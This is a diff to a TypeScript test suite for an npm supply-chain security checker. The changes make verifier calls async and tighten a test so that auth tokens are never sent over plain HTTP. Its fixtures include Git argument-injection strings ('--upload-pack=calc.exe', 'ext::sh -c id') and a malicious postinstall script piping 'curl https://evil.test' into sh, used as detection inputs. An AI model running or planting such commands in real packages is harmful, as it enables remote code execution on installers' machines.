@@ -187,7 +187,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
     assert.ok(chkRes.observations.some((o) => o.code === "ARCHIVE_CORRUPT_HEADER_CHECKSUM"));
   });
 
-  it("blocks Git argument injection, unsafe refs/subdirs, provenance-masked local drift, and tarball-only compromises", () => {
+  it("blocks Git argument injection, unsafe refs/subdirs, provenance-masked local drift, and tarball-only compromises", async () => {
     assert.equal(validateRemoteGitUrl("https://github.com/org/repo.git").valid, true);
     assert.equal(validateRemoteGitUrl("--upload-pack=calc.exe").valid, false);
     assert.equal(validateRemoteGitUrl("ext::sh -c id").valid, false);
@@ -229,7 +229,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       const c3 = git(["rev-parse", "HEAD"]);
 
       // Local Git drift MUST still trigger even when provenanceAttested=true
-      const drift = verifyTarballVsGitParity({
+      const drift = await verifyTarballVsGitParity({
         tarballManifest: { name: "@org/app", version: "2.0.0", scripts: { postinstall: "curl https://evil.test | sh" } },
         tarballEntries: [],
         provenanceAttested: true,
@@ -243,7 +243,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
         [c1, { version: "1.0.0", tarball_sha512: "sha512-CLEAN1==", provenance_attested: true }],
         [c3, { version: "2.0.0", tarball_sha512: "sha512-BAD2==", provenance_attested: false }],
       ]);
-      const decision = walkGitHistoryForCleanAnchor({
+      const decision = await walkGitHistoryForCleanAnchor({
         package_name: "@org/app",
         repoUrlOrLocalPath: repoDir,
         isLocalDir: true,
@@ -313,7 +313,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       const originUrl = `http://127.0.0.1:${originPort}/pkg`;
       const targetOrigin = `http://127.0.0.1:${targetPort}`;
       const ctrl = new AbortController();
-      // First hop matches origin; second hop jumps to different port (different origin) -> must reject non-HTTPS cross-origin OR strip auth
+      // First hop is plaintext HTTP: [MCP-09] MUST refuse attaching Bearer over non-HTTPS AND block cross-origin plain HTTP redirect!
       const crossHttpBlocked = await fetchWithSafeRedirects({
         url: originUrl,
         headers: { "user-agent": "test" },
@@ -322,7 +322,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
         allowPlainHttpOrigin: `http://127.0.0.1:${originPort}`,
         signal: ctrl.signal,
       });
-      assert.equal(originSawAuth, "Bearer SUPER_SECRET_NPM_TOKEN");
+      assert.equal(originSawAuth, undefined, "Authorization header MUST NEVER be sent over plaintext HTTP");
       assert.equal(crossHttpBlocked.ok, false); // Plain HTTP cross-origin blocked!
       assert.equal(targetSawAuth, "UNSET");
 
@@ -520,8 +520,8 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       }
       assert.equal(failed, true, "pack_plugin.py --no-overwrite must refuse overwriting existing archives");
 
-      // 3. Verify workspace mirror .agents/skills/coldpin matches skill-src/coldpin byte-for-byte
-      const srcRoot = resolve("skill-src/coldpin");
+      // 3. Verify workspace mirror .agents/skills/coldpin matches skills/coldpin byte-for-byte
+      const srcRoot = resolve("skills/coldpin");
       const mirrorRoot = resolve(".agents/skills/coldpin");
       const listFiles = (dir: string, prefix = ""): string[] => {
         const res: string[] = [];
@@ -725,7 +725,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       const c2 = git(["rev-parse", "HEAD"]);
 
       // KEV on clean HEAD C2 MUST NOT emit USE_PINNED_LATEST
-      const kevHead = walkGitHistoryForCleanAnchor({
+      const kevHead = await walkGitHistoryForCleanAnchor({
         package_name: "nm-pkg",
         repoUrlOrLocalPath: tmpDir,
         isLocalDir: true,
@@ -744,7 +744,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       git(["add", "."]);
       git(["commit", "-m", "c3 re-infected"]);
 
-      const nonMono = walkGitHistoryForCleanAnchor({
+      const nonMono = await walkGitHistoryForCleanAnchor({
         package_name: "nm-pkg",
         repoUrlOrLocalPath: tmpDir,
         isLocalDir: true,
@@ -1181,7 +1181,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
     const strictPolicy = { ...DEFAULT_POLICY, require_provenance: true };
 
     // 1. Unverified dist.attestations.url presence alone -> PROVENANCE_METADATA_UNVERIFIED, provenance_attested=false, fails strict require_provenance
-    const metaOnlyParity = verifyTarballVsGitParity({
+    const metaOnlyParity = await verifyTarballVsGitParity({
       tarballManifest: triage.manifest,
       tarballEntries: unpack.entries,
       provenanceAttested: false,
@@ -1222,7 +1222,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
     assert.equal(leafInsp.observations.length, 0);
     assert.ok(leafInsp.unknowns.some((u) => u.startsWith("PROVENANCE_TRUST_ROOT_UNVERIFIED")));
 
-    const leafParity = verifyTarballVsGitParity({
+    const leafParity = await verifyTarballVsGitParity({
       tarballManifest: triage.manifest,
       tarballEntries: unpack.entries,
       provenanceAttested: false,
@@ -1470,7 +1470,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
     assert.equal(privAtt.status, "metadata_url_only");
     assert.ok(privAtt.unknowns.some((u) => u.startsWith("PRIVATE_SCOPE_PROVENANCE_FETCH_SUPPRESSED")));
 
-    const earlyParity = verifyTarballVsGitParity({
+    const earlyParity = await verifyTarballVsGitParity({
       tarballManifest: null,
       tarballEntries: fpUnpack.entries,
       provenanceAttested: false,
@@ -1494,7 +1494,7 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       git(["commit", "-m", "v1 clean"]);
       const c1 = git(["rev-parse", "HEAD"]);
 
-      const strictHead = walkGitHistoryForCleanAnchor({
+      const strictHead = await walkGitHistoryForCleanAnchor({
         package_name: "strict-anchor",
         repoUrlOrLocalPath: tmpRepo,
         isLocalDir: true,
